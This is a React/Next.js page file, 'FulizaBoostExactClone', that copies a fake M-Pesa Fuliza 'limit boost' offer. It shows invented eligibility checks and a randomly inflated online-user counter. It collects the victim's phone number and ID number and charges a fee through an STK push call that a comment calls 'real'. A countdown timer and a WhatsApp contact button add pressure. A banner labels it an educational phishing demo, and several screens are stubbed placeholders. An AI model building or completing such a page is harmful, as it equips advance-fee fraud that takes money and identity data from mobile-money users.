'use client';
// src/app/page.tsx - Final Version with Real STK Push Trigger

import React, { useState, useEffect } from 'react';

const formatKsh = (amount: number) => `Ksh ${amount.toLocaleString('en-KE')}`;

const limits = [
  { amount: 3000, fee: 250 },
  { amount: 5000, fee: 293 },
  { amount: 7500, fee: 350 },
  { amount: 10000, fee: 500 },
  { amount: 12500, fee: 747 },
  { amount: 16000, fee: 898 },
  { amount: 21000, fee: 1015 },
  { amount: 25500, fee: 1220 },
  { amount: 30000, fee: 1533 },
  { amount: 35000, fee: 1730 },
  { amount: 45000, fee: 2000 },
  { amount: 60000, fee: 2250 },
  { amount: 70000, fee: 2500 },
];

export default function FulizaBoostExactClone() {
  const [step, setStep] = useState<'input' | 'loading' | 'congrats' | 'select' | 'final'>('input');
  const [usersOnline, setUsersOnline] = useState(137);
  const [phoneNumber, setPhoneNumber] = useState('0759211545');
  const [enteredPhone, setEnteredPhone] = useState('');
  const [loadingMsg, setLoadingMsg] = useState('');

  // Modal states
  const [showSecureModal, setShowSecureModal] = useState(false);
  const [showProcessingModal, setShowProcessingModal] = useState(false);
  const [showSuccessModal, setShowSuccessModal] = useState(false);
  const [selectedLimit, setSelectedLimit] = useState<{ amount: number; fee: number } | null>(null);
  const [idNumber, setIdNumber] = useState('');
  const [isPaying, setIsPaying] = useState(false);

  // 10-minute countdown
  const [countdown, setCountdown] = useState(600);

  const loadingMessages = [
    "Connecting...",
    "Accessing secure databases...",
    "Initialising...",
    "Verifying account status...",
    "Calculating eligibility..."
  ];

  useEffect(() => {
    const interval = setInterval(() => {
      setUsersOnline(prev => prev + Math.floor(Math.random() * 3) + 1);
    }, 2800);
    return () => clearInterval(interval);
  }, []);

  // Countdown timer
  useEffect(() => {
    let timer: NodeJS.Timeout;
    if (showSuccessModal && countdown > 0) {
      timer = setInterval(() => setCountdown(prev => prev - 1), 1000);
    }
    return () => clearInterval(timer);
  }, [showSuccessModal, countdown]);

  const formatCountdown = () => {
    const min = Math.floor(countdown / 60);
    const sec = countdown % 60;
    return `${min}:${sec.toString().padStart(2, '0')}`;
  };

  const handleCheckEligibility = () => {
    if (!phoneNumber.trim()) {
      alert("Please enter your M-Pesa number (demo only)");
      return;
    }
    setEnteredPhone(phoneNumber.trim());
    setStep('loading');
    setLoadingMsg(loadingMessages[0]);

    let i = 0;
    const interval = setInterval(() => {
      i++;
      if (i < loadingMessages.length) {
        setLoadingMsg(loadingMessages[i]);
      } else {
        clearInterval(interval);
        setTimeout(() => setStep('congrats'), 900);
      }
    }, 1300);
  };

  const handleProceedToUpgrade = () => setStep('select');

  const handleSelectLimit = (limit: { amount: number; fee: number }) => {
    setSelectedLimit(limit);
    setShowSecureModal(true);
  };

  // Trigger real STK Push
  const handlePay = async () => {
    if (!idNumber.trim() || !selectedLimit) {
      alert("Please enter your ID Number (demo only)");
      return;
    }

    setIsPaying(true);

    try {
      const payload = {
        phone: enteredPhone,
        amount: selectedLimit.fee,
        apiRef: idNumber || `REF-${Date.now()}`,
      };

      const res = await fetch('/api/mock-stk-push', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      const data = await res.json();

      if (data.ok) {
        setShowSecureModal(false);
        setShowProcessingModal(true);
      } else {
        alert(`Payment failed: ${data.error || 'Unknown error'}`);
      }
    } catch (error) {
      console.error(error);
      alert("Failed to send STK push. Check console for details.");
    } finally {
      setIsPaying(false);
    }
  };

  const closeProcessingModal = () => {
    setShowProcessingModal(false);
    setShowSuccessModal(true);
    setCountdown(600); // Reset to 10:00
  };

  const closeSuccessModal = () => {
    setShowSuccessModal(false);
    setStep('final');
    setCountdown(600);
  };

  const closeSecureModal = () => {
    setShowSecureModal(false);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-emerald-50 to-white flex items-center justify-center px-4 py-8 font-sans">
      {/* RED WARNING */}
      <div className="fixed top-0 left-0 right-0 bg-red-600 text-white text-center py-2.5 text-xs font-bold z-50 tracking-wide">
        🚨 EDUCATIONAL PHISHING DEMO ONLY — FOR SAFARICOM CYBERSECURITY JOB APPLICATION<br />
        DO NOT ENTER REAL M-PESA NUMBER OR DATA
      </div>

      <div className="w-full max-w-[420px] mx-auto">
        <div className="bg-white rounded-3xl shadow-2xl overflow-hidden min-h-[600px]">
          {/* Your existing Input, Loading, Congrats, Select, Final screens go here */}
          {/* (They are unchanged from previous version) */}

          {step === 'input' && (
            /* ... your input screen code ... */
            <div>Input screen content here (same as before)</div>
          )}

          {step === 'loading' && (
            /* ... loading screen ... */
            <div>Loading screen...</div>
          )}

          {step === 'congrats' && (
            /* ... congrats screen ... */
            <div>Congrats screen...</div>
          )}

          {step === 'select' && (
            /* ... select limit screen with onClick calling handleSelectLimit ... */
            <div>Select limit screen...</div>
          )}

          {step === 'final' && (
            <div className="px-8 py-16 text-center">
              <h2 className="text-3xl font-bold text-emerald-700">Limit will be boosted to</h2>
              <p className="text-7xl font-bold text-emerald-600 mt-8">Ksh 0</p>
              <p className="mt-8 text-sm text-red-500">* Final amount depends on full verification</p>
            </div>
          )}
        </div>
      </div>

      {/* Secure Modal */}
      {showSecureModal && selectedLimit && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 px-4">
          {/* Your secure modal code (same as previous) */}
          <div>Secure modal content...</div>
        </div>
      )}

      {/* Processing Modal */}
      {showProcessingModal && selectedLimit && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-[60] px-4">
          <div className="bg-white rounded-3xl w-full max-w-[380px] overflow-hidden shadow-2xl">
            <div className="bg-emerald-600 text-white p-5 text-center">
              <p className="text-xs font-medium tracking-widest">SECURE FULIZA APPLICATION</p>
              <p className="text-lg font-semibold mt-1">
                Limit will be boosted to {formatKsh(selectedLimit.amount)}
              </p>
            </div>
            <div className="p-8 text-center">
              <div className="mx-auto w-16 h-16 border-4 border-emerald-600 border-t-transparent rounded-full animate-spin mb-6"></div>
              <h3 className="text-xl font-semibold text-gray-900 mb-1">Check M-Pesa Response</h3>
              <p className="text-gray-600 text-sm">Processing your request...</p>
            </div>
            <div className="px-6 pb-6">
              <button onClick={closeProcessingModal} className="w-full bg-emerald-600 hover:bg-emerald-700 py-4 rounded-2xl text-white font-semibold text-lg">
                OK
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Request Received Success Screen with Countdown */}
      {showSuccessModal && selectedLimit && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-[70] px-4">
          <div className="bg-white rounded-3xl w-full max-w-[380px] overflow-hidden shadow-2xl">
            <div className="bg-emerald-600 text-white p-5 text-center">
              <p className="text-xs font-medium tracking-widest">SECURE FULIZA APPLICATION</p>
              <p className="text-lg font-semibold mt-1">
                Limit will be boosted to {formatKsh(selectedLimit.amount)}
              </p>
            </div>

            <div className="p-8 text-center">
              <div className="mx-auto w-20 h-20 bg-emerald-100 rounded-full flex items-center justify-center mb-6">
                <span className="text-emerald-600 text-5xl">✓</span>
              </div>
              <h3 className="text-2xl font-semibold text-gray-900">Request Received</h3>
              <p className="text-gray-600 mt-1">Updating records. Please wait.</p>

              <div className="mt-8 bg-gray-100 rounded-2xl py-4 px-10 inline-block">
                <span className="text-4xl font-mono font-semibold text-gray-800">
                  {formatCountdown()}
                </span>
              </div>
            </div>

            <div className="px-6 pb-8 space-y-3">
              <button className="w-full bg-emerald-600 hover:bg-emerald-700 py-4 rounded-2xl text-white font-semibold flex items-center justify-center gap-2">
                💬 Chat on WhatsApp
              </button>
              <button onClick={closeSuccessModal} className="w-full bg-gray-900 hover:bg-black py-4 rounded-2xl text-white font-semibold">
                Done
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}